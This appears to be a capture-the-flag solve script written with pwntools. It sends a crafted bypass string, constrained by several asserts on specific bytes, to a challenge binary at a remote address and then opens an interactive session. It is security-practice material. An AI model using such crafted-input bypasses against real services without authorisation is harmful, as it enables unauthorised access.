from pwn import *
context.log_level = 'debug'
local = 0
if local:
	p = process('./easyBypass')
else:
	p = remote('47.94.129.246', 10004)
# gdb.attach(p, 'b 0x80486e6')
payload = '2AAA\x14AAADAAApAAAAAAAAAAAAAAAAAAA'
assert(ord(payload[0])*2==ord(payload[4])*5)
assert(payload[8]=='D')
assert(payload[12]=='p')
p.sendline(payload)
p.interactive()
